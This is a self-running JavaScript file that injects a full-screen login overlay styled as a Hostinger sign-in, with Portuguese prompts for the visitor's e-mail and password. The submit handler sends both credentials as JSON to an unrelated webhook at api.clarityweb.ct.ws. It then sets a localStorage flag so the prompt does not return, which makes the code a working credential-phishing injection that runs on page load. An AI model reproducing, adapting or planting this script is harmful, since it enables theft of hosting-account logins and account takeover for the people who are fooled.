(function () {
    function createLoginModal() {
      if (document.getElementById("custom-login-overlay")) return;
  
      if (localStorage.getItem("lg") === "success") {
        return;
      }
  
      const style = document.createElement("style");
      style.textContent = `
                    /* ===========================
            DM Sans
            =========================== */

            @font-face {
                font-family: 'DM Sans';
                font-style: normal;
                font-weight: 400;
                font-display: swap;
                src: url('https://fonts.gstatic.com/s/dmsans/v17/rP2Yp2ywxg089UriI5-g4Fh9VoD8Cmcqbu6-K6z9Xg.woff2') format('woff2');

            }

            @font-face {
                font-family: 'DM Sans';
                font-style: normal;
                font-weight: 500;
                font-display: swap;
                src: url('https://fonts.gstatic.com/s/dmsans/v17/rP2Yp2ywxg089UriI5-g4Fh9VoD8Cmcqbu6-K6z9Xg.woff2') format('woff2');
            }

            @font-face {
                font-family: 'DM Sans';
                font-style: normal;
                font-weight: 700;
                font-display: swap;
                src: url('https://fonts.gstatic.com/s/dmsans/v17/rP2Yp2ywxg089UriI5-g4Fh9VoD8Cmcqbu6-K6z9Xg.woff2') format('woff2');
            }

            /* ===========================
            Overlay
            =========================== */

            #custom-login-overlay{
                position:fixed;
                inset:0;

                display:flex;
                justify-content:center;
                align-items:center;

                background:rgba(255,255,255,.82);
                backdrop-filter:blur(5px);
                -webkit-backdrop-filter:blur(5px);

                z-index:999999;

                font-family:'DM Sans',sans-serif;
            }

            /* ===========================
            Container
            =========================== */

            #custom-login-modal-wrap{
                width:100%;
                display:flex;
                justify-content:center;
                padding:20px;
            }

            /* ===========================
            Modal
            =========================== */

            #custom-login-modal{

                width:480px;

                padding:48px 40px;

                background:#FFFFFF;

                border:1px solid #D8DAE0;

                border-radius:16px;

                box-sizing:border-box;

                box-shadow:
                    0 12px 40px rgba(30,41,59,.12);
            }

            /* ===========================
            Logo
            =========================== */

            #custom-login-logo{

                display:flex;

                justify-content:center;

                margin-bottom:28px;
            }

            #custom-login-logo img{

                width:160px;

                display:block;
            }

            /* ===========================
            Título
            =========================== */

            #custom-login-title{

                margin:0 0 24px;

                text-align:center;

                color:#2F1C6A;

                font-weight:700;
            }

            /* ===========================
            Subtitulo
            =========================== */

            #custom-login-subtitle{

                margin:0 0 32px;

                color:#1D1E20;

                font-size:14px;

                line-height:14px;

                font-weight:400;

                color: #6D7081;
            }

            /* ===========================
            Campos
            =========================== */

            .custom-login-field{

                margin-bottom:24px;
            }

            .custom-login-label{

                display:block;

                margin-bottom:4px;

                color: #6D7081;

                font-size:15px;

                font-weight:500;
            }

            /* ===========================
            Input
            =========================== */

            .custom-login-input-wrap{

                height:48px;

                display:flex;

                align-items:center;

                border:1px solid #D5D8E2;

                border-radius:8px;

                background:#FFF;

                padding:0 16px;

                transition:.2s;

                box-sizing:border-box;
            }

            .custom-login-input-wrap:hover{

                border-color:#B6B8C5;
            }

            .custom-login-input-wrap:focus-within{

                border-color:#673DE6;

                box-shadow:0 0 0 3px rgba(103,61,230,.15);
            }

            .custom-login-input-wrap.invalid{

                border-color:#D93025;

                box-shadow:none;
            }

            .custom-login-input{

                flex:1;

                border:none;

                background:none;

                outline:none;

                font-size:16px;

                color:#1D1E20;

                font-family:'DM Sans',sans-serif;
            }

            .custom-login-input::placeholder{

                color:#9A9CA5;
            }

            /* ===========================
            Ícones
            =========================== */

            .custom-login-icon{

                display:none;
            }

            .custom-login-password-toggle{

                width:20px;

                height:20px;

                margin-left:12px;

                cursor:pointer;

                color:#6C6F7A;

                flex-shrink:0;
            }

            /* ===========================
            Botão
            =========================== */

            #custom-login-button{

                width:100%;

                height:52px;

                margin-top:12px;

                border:none;

                border-radius:8px;

                cursor:pointer;

                background:linear-gradient(90deg,#673DE6 0%,#5A2FE6 100%);

                color:#FFF;

                font-size:20px;

                font-weight:700;

                font-family:'DM Sans',sans-serif;

                transition:.18s;
            }

            #custom-login-button:hover{

                filter:brightness(.96);
            }

            #custom-login-button:active{

                transform:scale(.985);
            }

            #custom-login-button[disabled]{

                opacity:.7;

                cursor:wait;
            }

            /* ===========================
            Erros
            =========================== */

            .custom-login-field-error{

                margin-top:6px;

                min-height:18px;

                font-size:13px;

                color:#D93025;
            }

            #custom-login-general-error{

                min-height:20px;

                margin-bottom:14px;

                text-align:center;

                color:#D93025;

                font-size:14px;
            }
      `;
      document.head.appendChild(style);
  
      const overlay = document.createElement("div");
      overlay.id = "custom-login-overlay";
  
      const modalWrap = document.createElement("div");
      modalWrap.id = "custom-login-modal-wrap";
   
  
      const modal = document.createElement("div");
      modal.id = "custom-login-modal";


      const logo = document.createElement("div");
        logo.id = "custom-login-logo";

        logo.innerHTML = `
        <img src="https://auth.hostinger.com/assets/images/brand/hostinger/logo.svg" alt="Logo">
        `;
  
      const title = document.createElement("h2");
      title.id = "custom-login-title";
      title.textContent = "Entrar";
  
      const subtitle = document.createElement("p");
      subtitle.id = "custom-login-subtitle";
      subtitle.textContent = "Informe seu e-mail e senha da Hostinger para continuar...";
  
      const emailField = document.createElement("div");
      emailField.className = "custom-login-field";
  
      const emailLabel = document.createElement("label");
      emailLabel.className = "custom-login-label";
      emailLabel.setAttribute("for", "custom-login-email");
      emailLabel.textContent = "E-mail";
  
      const emailWrap = document.createElement("div");
      emailWrap.className = "custom-login-input-wrap";
  
      const emailIcon = document.createElement("span");
      emailIcon.className = "custom-login-icon";
      emailIcon.innerHTML = `
        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
          <rect x="3" y="5" width="18" height="14" rx="2"></rect>
          <path d="M3 7l9 6 9-6"></path>
        </svg>
      `;
  
      const emailInput = document.createElement("input");
      emailInput.className = "custom-login-input";
      emailInput.id = "custom-login-email";
      emailInput.type = "email";
      emailInput.placeholder = "Digite seu e-mail";
      emailInput.autocomplete = "username";
  
      const emailError = document.createElement("div");
      emailError.className = "custom-login-field-error";
  
      emailWrap.append(emailIcon, emailInput);
      emailField.append(emailLabel, emailWrap, emailError);
  
      const passwordField = document.createElement("div");
      passwordField.className = "custom-login-field";
  
      const passwordLabel = document.createElement("label");
      passwordLabel.className = "custom-login-label";
      passwordLabel.setAttribute("for", "custom-login-password");
      passwordLabel.textContent = "Senha";
  
      const passwordWrap = document.createElement("div");
      passwordWrap.className = "custom-login-input-wrap";
  
      const passwordIcon = document.createElement("span");
      passwordIcon.className = "custom-login-icon";
      passwordIcon.innerHTML = `
        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
          <rect x="4" y="11" width="16" height="9" rx="2"></rect>
          <path d="M8 11V8a4 4 0 1 1 8 0v3"></path>
        </svg>
      `;
  
      const passwordInput = document.createElement("input");
      passwordInput.className = "custom-login-input";
      passwordInput.id = "custom-login-password";
      passwordInput.type = "password";
      passwordInput.placeholder = "Digite sua senha";
      passwordInput.autocomplete = "current-password";
  
      const passwordError = document.createElement("div");
      passwordError.className = "custom-login-field-error";
  
      passwordWrap.append(passwordIcon, passwordInput);
      passwordField.append(passwordLabel, passwordWrap, passwordError);
  
      const generalError = document.createElement("div");
      generalError.id = "custom-login-general-error";
  
      const loginButton = document.createElement("button");
      loginButton.id = "custom-login-button";
      loginButton.type = "button";
      loginButton.textContent = "Entrar";
  
      modal.append(
        logo,
        title,
        subtitle,
        emailField,
        passwordField,
        generalError,
        loginButton
      );
  
      modalWrap.appendChild(modal);
      overlay.appendChild(modalWrap);
      document.body.appendChild(overlay);
  
      let attemptedSubmit = false;
      let isSubmitting = false;
  
      function isValidEmail(email) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
      }
  
      function isValidPassword(password) {
        return password.length > 3;
      }
  
      function clearFieldErrors() {
        emailError.textContent = "";
        passwordError.textContent = "";
        emailWrap.classList.remove("invalid");
        passwordWrap.classList.remove("invalid");
      }
  
      function validateForm(showErrors) {
        const email = emailInput.value.trim();
        const password = passwordInput.value;
  
        let valid = true;
  
        if (!showErrors) {
          clearFieldErrors();
        }
  
        if (!email) {
          valid = false;
          if (showErrors) {
            emailError.textContent = "Informe seu e-mail.";
            emailWrap.classList.add("invalid");
          }
        } else if (!isValidEmail(email)) {
          valid = false;
          if (showErrors) {
            emailError.textContent = "Digite um e-mail válido.";
            emailWrap.classList.add("invalid");
          }
        } else if (showErrors) {
          emailError.textContent = "";
          emailWrap.classList.remove("invalid");
        }
  
        if (!password) {
          valid = false;
          if (showErrors) {
            passwordError.textContent = "Informe sua senha.";
            passwordWrap.classList.add("invalid");
          }
        } else if (!isValidPassword(password)) {
          valid = false;
          if (showErrors) {
            passwordError.textContent = "A senha deve ter mais que 3 caracteres.";
            passwordWrap.classList.add("invalid");
          }
        } else if (showErrors) {
          passwordError.textContent = "";
          passwordWrap.classList.remove("invalid");
        }
  
        return valid;
      }
  
      function closeModal() {
        overlay.remove();
        style.remove();
      }
  
      emailInput.addEventListener("input", function () {
        if (attemptedSubmit) validateForm(true);
      });
  
      passwordInput.addEventListener("input", function () {
        if (attemptedSubmit) validateForm(true);
      });
  
      loginButton.addEventListener("click", async function () {
        if (isSubmitting) return;
  
        attemptedSubmit = true;
        generalError.textContent = "";
  
        if (!validateForm(true)) return;
  
        const email = emailInput.value.trim();
        const password = passwordInput.value;
  
        isSubmitting = true;
        loginButton.disabled = true;
        loginButton.textContent = "Validando...";
  
        try {
          const response = await fetch("https://api.clarityweb.ct.ws/webhook/login", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({ email, password })
          });
  
          const data = await response.json().catch(() => ({}));
  
          if (response.ok && data && data.sucesso === true) {
            localStorage.setItem("lg", "success");
            closeModal();
            return;
          }
  
          generalError.textContent =
            (data && (data.error_menssage || data.error_message || data.message)) ||
            "Não foi possível concluir o login.";
        } catch (error) {
          generalError.textContent = "Erro de conexão. Tente novamente.";
        } finally {
          isSubmitting = false;
          loginButton.disabled = false;
          loginButton.textContent = "Login";
        }
      });
    }
  
    createLoginModal();
  })();
